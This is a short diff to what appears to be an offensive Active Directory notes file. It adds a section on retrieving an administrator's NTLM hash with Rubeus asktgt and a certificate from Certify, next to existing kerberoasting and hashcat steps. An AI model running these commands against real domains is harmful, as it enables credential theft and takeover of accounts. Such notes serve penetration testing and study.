@@ -53,6 +53,11 @@
 1. ``` .\Rubeus.exe kerberoast /outfile:hashes.kerberoast ```
 2. hashcat crack
 
+## Pass hash by certificate
+- https://github.com/GhostPack/Certify
+- (cert may get from certify.exe or other places)
+- ``` .\Rubeus.exe asktgt /user:administrator /certificate:xxx.pfx /getcredentials /show /nowrap``` show ntlm hash
+
 ## Silver Tickets
 - Forge service tickets step
 - Target forging TGS
